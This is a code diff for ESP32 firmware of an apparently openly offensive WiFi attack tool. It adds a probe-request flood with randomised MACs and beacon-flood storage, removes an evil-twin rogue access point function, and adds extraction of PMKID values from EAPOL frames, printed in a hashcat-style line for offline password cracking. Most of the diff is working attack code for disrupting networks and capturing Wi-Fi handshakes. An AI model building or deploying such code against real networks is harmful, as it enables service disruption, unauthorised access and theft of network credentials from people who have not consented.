@@ -87,27 +87,33 @@ BruceWiFi& BruceWiFi::getInstance() {
 }
 
 BruceWiFi::BruceWiFi()
-    : m_state(WiFiAdapterState::IDLE)
-    , m_initialized(false)
-    , m_promiscuousEnabled(false)
+    : m_initialized(false)
+    , m_state(WiFiAdapterState::IDLE)
     , m_currentChannel(1)
+    , m_promiscuousEnabled(false)
     , m_packetsSent(0)
     , m_lastPacketMs(0)
     , m_handshakeCaptured(false)
-    , m_beaconSsids(nullptr)
+    , m_onScanComplete(nullptr)
+    , m_onAttackProgress(nullptr)
+    , m_onHandshakeCaptured(nullptr)
+    , m_onPacketReceived(nullptr)
+    , m_onAssociation(nullptr)
+    , m_onWidsAlert(nullptr)
+    , m_deauthCount(0)
+    , m_eapolCount(0)
+    , m_lastWidsCheckMs(0)
     , m_beaconSsidCount(0)
     , m_beaconCurrentIndex(0)
     , m_beaconChannel(1)
     , m_evilTwinChannel(1)
     , m_evilTwinDeauth(false)
     , m_pcapWriter(nullptr)
-    , m_deauthCount(0)
-    , m_eapolCount(0)
-    , m_lastWidsCheckMs(0)
 {
     memset(m_attackTargetMac, 0, 6);
     memset(m_attackApMac, 0, 6);
     memset(m_evilTwinSSID, 0, sizeof(m_evilTwinSSID));
+    memset(m_beaconSsidStorage, 0, sizeof(m_beaconSsidStorage));
     s_instance = this;
 }
 
@@ -125,6 +131,7 @@ bool BruceWiFi::onEnable() {
     
     if (RadioWarden::getInstance().requestRadio(RadioOwner::OWNER_WIFI_STA)) {
         m_enabled = true;
+        m_initialized = true;
         m_state = WiFiAdapterState::IDLE;
         return true;
     }
@@ -138,6 +145,7 @@ void BruceWiFi::onDisable() {
     setPromiscuous(false);
     // Warden handles the low-level esp_wifi_stop()
     m_enabled = false;
+    m_initialized = false;
     m_state = WiFiAdapterState::IDLE;
 }
 
@@ -188,6 +196,17 @@ void BruceWiFi::onTick() {
             break;
         case WiFiAdapterState::MONITORING:
             tickMonitor();
+            break;
+        case WiFiAdapterState::PROBE_FLOODING:
+            tickProbeFlood();
+            break;
+        case WiFiAdapterState::EVIL_TWIN_ACTIVE:
+            // Evil Portal ticks itself via SystemTask
+            break;
+        case WiFiAdapterState::ERROR:
+            // Log and attempt recovery
+            if (Serial) Serial.println("[WiFi] Error state, resetting to IDLE");
+            m_state = WiFiAdapterState::IDLE;
             break;
         default:
             break;
@@ -340,8 +359,11 @@ bool BruceWiFi::beaconFlood(const char** ssids, size_t count, uint8_t channel) {
     stopHardwareActivities();
     setChannel(channel);
 
-    m_beaconSsids = ssids;
-    m_beaconSsidCount = count;
+    m_beaconSsidCount = min(count, (size_t)MAX_BEACON_SSIDS);
+    for (size_t i = 0; i < m_beaconSsidCount; i++) {
+        strncpy(m_beaconSsidStorage[i], ssids[i], 32);
+        m_beaconSsidStorage[i][32] = '\0';
+    }
     m_beaconCurrentIndex = 0;
     m_beaconChannel = channel;
 
@@ -380,7 +402,7 @@ void BruceWiFi::tickBeaconFlood() {
     }
     m_lastPacketMs = now;
 
-    if (!m_beaconSsids || m_beaconSsidCount == 0) {
+    if (m_beaconSsidCount == 0) {
         m_state = WiFiAdapterState::IDLE;
         return;
     }
@@ -402,7 +424,7 @@ void BruceWiFi::tickBeaconFlood() {
     memcpy(&frame[BEACON_BSSID_OFFSET], bssid, 6);
 
     // Set SSID
-    const char* ssid = m_beaconSsids[m_beaconCurrentIndex];
+    const char* ssid = m_beaconSsidStorage[m_beaconCurrentIndex];
     size_t ssidLen = strlen(ssid);
     if (ssidLen > 32) ssidLen = 32;
 
@@ -488,82 +510,8 @@ void BruceWiFi::tickHandshakeCapture() {
     // Handshake detection happens in promiscuous callback
 }
 
-// =============================================================================
-// EVIL TWIN
-// =============================================================================
-
-// Evil Twin state is now in class members (m_evilTwinSSID, etc.)
-
-bool BruceWiFi::startEvilTwin(const char* ssid,
-                               uint8_t channel,
-                               bool sendDeauth) {
-    if (!ssid || strlen(ssid) == 0) return false;
-
-    stopHardwareActivities();
-
-    // Save config
-    strncpy(m_evilTwinSSID, ssid, 32);
-    m_evilTwinSSID[32] = '\0';
-    m_evilTwinChannel = channel;
-    m_evilTwinDeauth = sendDeauth;
-
-    // Stop station mode
-    WiFi.disconnect(true);
-    WiFi.mode(WIFI_OFF);
-    delay(100);
-
-    // Start soft AP with cloned SSID (open network)
-    WiFi.mode(WIFI_AP);
-    WiFi.softAPConfig(IPAddress(192, 168, 4, 1),
-                      IPAddress(192, 168, 4, 1),
-                      IPAddress(255, 255, 255, 0));
-
-    if (!WiFi.softAP(m_evilTwinSSID, "", m_evilTwinChannel)) {
-        if (Serial) {
-            Serial.println("[WiFi] Failed to start Evil Twin AP");
-        }
-        WiFi.mode(WIFI_STA);
-        return false;
-    }
-
-    if (Serial) {
-        Serial.printf("[WiFi] Evil Twin started: %s on ch%d\n", m_evilTwinSSID, m_evilTwinChannel);
-        Serial.printf("[WiFi] AP IP: %s\n", WiFi.softAPIP().toString().c_str());
-    }
-
-    m_state = WiFiAdapterState::EVIL_TWIN_ACTIVE;
-    m_packetsSent = 0;
-    m_lastPacketMs = millis();
-
-    // Note: Full captive portal requires WebServer and DNSServer
-    // For now, just creates the fake AP - clients will see it
-
-    return true;
-}
-
-void BruceWiFi::stopEvilTwin() {
-    if (m_state == WiFiAdapterState::EVIL_TWIN_ACTIVE) {
-        WiFi.softAPdisconnect(true);
-        WiFi.mode(WIFI_OFF);
-        delay(100);
-        WiFi.mode(WIFI_STA);
-
-        if (Serial) {
-            Serial.println("[WiFi] Evil Twin stopped");
-        }
-
-        m_state = WiFiAdapterState::IDLE;
-    }
-}
-
-int BruceWiFi::getCapturedCredentialCount() const {
-    // Delegate to EvilPortal for actual count
-    return 0;  // EvilPortal tracks its own credentials
-}
-
-void BruceWiFi::onCredentialCaptured(CredentialCapturedCallback cb) {
-    m_onCredentialCaptured = cb;
-}
+// Evil Twin is handled by EvilPortal class (see SystemTask::handleActionStart).
+// startEvilTwin()/stopEvilTwin() removed as dead code.
 
 // =============================================================================
 // PASSIVE MONITORING
@@ -598,13 +546,97 @@ void BruceWiFi::tickMonitor() {
 }
 
 // =============================================================================
+// PROBE FLOOD
+// =============================================================================
+
+bool BruceWiFi::startProbeFlood(uint8_t channel) {
+    if (!m_initialized) return false;
+
+    stopHardwareActivities();
+    setChannel(channel);
+
+    m_packetsSent = 0;
+    m_lastPacketMs = 0;
+    m_state = WiFiAdapterState::PROBE_FLOODING;
+
+    if (Serial) Serial.printf("[WiFi] Probe flood started on ch%d\n", channel);
+    return true;
+}
+
+void BruceWiFi::stopProbeFlood() {
+    if (m_state == WiFiAdapterState::PROBE_FLOODING) {
+        m_state = WiFiAdapterState::IDLE;
+        if (Serial) Serial.println("[WiFi] Probe flood stopped");
+    }
+}
+
+void BruceWiFi::tickProbeFlood() {
+    uint32_t now = millis();
+    if (now - m_lastPacketMs < DEAUTH_INTERVAL_MS) return;
+    m_lastPacketMs = now;
+
+    // Build probe request frame (subtype 0x40)
+    uint8_t frame[64];
+    memset(frame, 0, sizeof(frame));
+
+    // Frame control: Probe Request (0x40 0x00)
+    frame[0] = 0x40;
+    frame[1] = 0x00;
+    // Duration
+    frame[2] = 0x00;
+    frame[3] = 0x00;
+    // DA: Broadcast
+    memset(&frame[4], 0xFF, 6);
+    // SA: Random MAC (rotate each frame)
+    for (int i = 0; i < 6; i++) frame[10 + i] = random(256);
+    frame[10] &= 0xFE; // Unicast
+    frame[10] |= 0x02; // Locally administered
+    // BSSID: Broadcast
+    memset(&frame[16], 0xFF, 6);
+    // Sequence number
+    frame[22] = random(256);
+    frame[23] = random(256);
+    // SSID IE: Random SSID
+    frame[24] = 0x00; // Tag: SSID
+    uint8_t ssidLen = 8 + random(8); // 8-15 chars
+    frame[25] = ssidLen;
+    for (int i = 0; i < ssidLen; i++) {
+        frame[26 + i] = 'a' + random(26);
+    }
+    // Supported Rates IE
+    int ratesOffset = 26 + ssidLen;
+    frame[ratesOffset] = 0x01; // Tag: Supported Rates
+    frame[ratesOffset + 1] = 0x04;
+    frame[ratesOffset + 2] = 0x82;
+    frame[ratesOffset + 3] = 0x84;
+    frame[ratesOffset + 4] = 0x8B;
+    frame[ratesOffset + 5] = 0x96;
+
+    int frameLen = ratesOffset + 6;
+    sendRawFrame(frame, frameLen);
+    m_packetsSent++;
+
+    if (m_onAttackProgress) {
+        m_onAttackProgress(m_packetsSent);
+    }
+}
+
+// =============================================================================
 // ATTACK CONTROL
 // =============================================================================
 
 void BruceWiFi::stopHardwareActivities() {
-    // Stop Evil Twin if running
+    // Stop Evil Twin if running (EvilPortal handles its own cleanup)
     if (m_state == WiFiAdapterState::EVIL_TWIN_ACTIVE) {
-        stopEvilTwin();
+        WiFi.softAPdisconnect(true);
+        WiFi.mode(WIFI_OFF);
+        delay(100);
+        WiFi.mode(WIFI_STA);
+        m_state = WiFiAdapterState::IDLE;
+    }
+
+    if (m_state == WiFiAdapterState::PROBE_FLOODING) {
+        stopProbeFlood();
     }
 
     setPromiscuous(false);
@@ -716,6 +748,30 @@ void BruceWiFi::promiscuousCallback(void* buf, wifi_promiscuous_pkt_type_t type)
         if (subtype == 0xC0 || subtype == 0xA0) {
             s_instance->m_deauthCount++;
         }
+
+        // Probe Request Detection (subtype 0x40)
+        if (subtype == 0x40 && len >= 24) {
+            // Addr2 = Source MAC (the station sending the probe)
+            const uint8_t* srcMac = &payload[10];
+            // Check for non-broadcast source
+            if (!(srcMac[0] & 0x01)) {
+                // Extract probed SSID from the Tagged Parameters
+                // SSID IE starts at offset 24 (after fixed frame fields)
+                const char* probedSsid = "";
+                if (len > 26 && payload[24] == 0x00) { // Tag 0 = SSID
+                    uint8_t ssidLen = payload[25];
+                    if (ssidLen > 0 && ssidLen <= 32 && 26 + ssidLen <= len) {
+                        probedSsid = (const char*)&payload[26];
+                    }
+                }
+                // Forward as association event for TargetTable tracking
+                // Use the probing station as "client" with broadcast as "AP"
+                if (s_instance->m_onAssociation) {
+                    static const uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
+                    s_instance->m_onAssociation(srcMac, broadcast);
+                }
+            }
+        }
     }
 
     // [PHASE 3.1] Client Discovery Implementation
@@ -772,14 +828,43 @@ void BruceWiFi::promiscuousCallback(void* buf, wifi_promiscuous_pkt_type_t type)
         // We look for 0x88 0x8e in the payload.
         for (int i = 0; i < len - 1; i++) {
             if (payload[i] == 0x88 && payload[i+1] == 0x8e) {
-                // Found potential EAPOL!
+                // Found EAPOL frame
                 s_instance->m_eapolCount++;
-                
+                s_instance->m_handshakeCaptured = true;
+
+                // PMKID Detection: RSN IE (tag 0x30) in EAPOL Message 1
+                // PMKID is the last 16 bytes in the RSN IE of key message 1
+                // Key Info field at offset +5 from EAPOL start, bit 3 = pairwise
+                int eapolStart = i + 2; // Skip ethertype
+                if (eapolStart + 99 < len) {
+                    // Scan for RSN IE tag (0x30) within the EAPOL payload
+                    for (int j = eapolStart + 20; j < len - 18; j++) {
+                        if (payload[j] == 0x30) { // RSN IE tag
+                            uint8_t rsnLen = payload[j + 1];
+                            // PMKID list is at the end of RSN IE
+                            // If RSN IE contains a PMKID, the last 2+16 bytes are count(2) + PMKID(16)
+                            if (rsnLen >= 20 && j + 2 + rsnLen <= len) {
+                                int pmkidOffset = j + 2 + rsnLen - 16;
+                                // Log PMKID in hashcat format to serial
+                                if (Serial) {
+                                    wifi_data_frame_header_t* hdr = (wifi_data_frame_header_t*)payload;
+                                    Serial.print("[WiFi] PMKID: ");
+                                    for (int k = 0; k < 16; k++) Serial.printf("%02x", payload[pmkidOffset + k]);
+                                    Serial.print("*");
+                                    for (int k = 0; k < 6; k++) Serial.printf("%02x", hdr->addr2[k]); // AP MAC
+                                    Serial.print("*");
+                                    for (int k = 0; k < 6; k++) Serial.printf("%02x", hdr->addr1[k]); // STA MAC
+                                    Serial.println();
+                                }
+                            }
+                            break;
+                        }
+                    }
+                }
+
                 if (s_instance->m_onHandshakeCaptured) {
-                    // In a real handshake, we'd captures multiple parts. 
-                    // For now, signal that we saw EAPOL for this BSSID.
                     wifi_data_frame_header_t* header = (wifi_data_frame_header_t*)payload;
-                    s_instance->m_onHandshakeCaptured(header->addr3); // Addr3 is BSSID
+                    s_instance->m_onHandshakeCaptured(header->addr3);
                 }
                 break;
             }
